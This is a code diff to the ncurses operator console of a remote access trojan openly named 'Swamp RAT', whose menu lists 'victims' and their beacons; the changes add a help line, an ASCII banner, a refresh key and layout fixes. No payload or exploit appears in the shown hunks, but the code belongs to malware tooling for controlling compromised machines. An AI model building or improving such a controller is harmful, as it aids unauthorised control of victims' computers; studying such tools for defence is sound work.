@@ -34,8 +34,9 @@ WINDOW *win_main;
 int  x_margin = 4;
 int  y_margin = 2;
 char win_menu_title[] = "V!cT!m5";
-char win_main_version[] = "|0.9b|";
+char win_main_version[] = "|lillypad|";
 char win_main_title[] = "|Swamp RAT|";
+char win_main_msg[] = "~~(__`*>";
 
 pthread_mutex_t ncurses_mutex = PTHREAD_MUTEX_INITIALIZER;
 
@@ -96,7 +97,7 @@ bool ncurses_window_footer(WINDOW *win, char *footer){
   */
   int x, y;
   getmaxyx(win, y, x);
-  mvprintw(y - 1, ((x / 2) - (strlen(footer) / 2)), footer);
+  mvprintw(y - 1, ((x / 2) - (strlen(footer) / 2) + 1), footer);
   refresh();
   return true;
 }
@@ -265,6 +266,8 @@ bool ncurses_wmain(int action, net_client_beacon_t **p_victims){
     wclear(win_main);
     wclear(win_menu);
     mvprintw(1, 1, "victims: %d\n", NET_VICTIMS_TOTAL);
+    mvprintw(y - 2, 1, "HELP: refresh:[R|r] select:[ENTER] navigate:[arrows]");
+    mvprintw(1, x - strlen(win_main_msg) -1, win_main_msg);
     box(win_main, 0, 0);
     ncurses_window_title(win_main, win_main_title);
     ncurses_window_footer(win_main, win_main_version);
@@ -274,7 +277,7 @@ bool ncurses_wmain(int action, net_client_beacon_t **p_victims){
     wmove(win_menu, 4, 2);
     wresize(win_menu, (y - (y_margin * 2)), (x - (x_margin * 2)));
     set_menu_win(menu, win_menu);
-    set_menu_sub(menu, derwin(win_menu, 6, (x - (x_margin *2) - 4), 3, 1));
+    set_menu_sub(menu, derwin(win_menu, (y - (y_margin * 2) - 4), (x - (x_margin *2) - 4), 3, 1));
     set_menu_mark(menu, " -> ");
     box(win_menu, 0, 0);
     ncurses_print_menu_title(win_menu, 1, 0, (x - (x_margin * 2)), win_menu_title);
@@ -330,6 +333,9 @@ bool ncurses_main(){
   while(true){
     key = getch();
     if (key == KEY_RESIZE){
+      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
+    }
+    if (key == 'r' || key == 'R'){
       ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
     }
     if (key == KEY_DOWN){
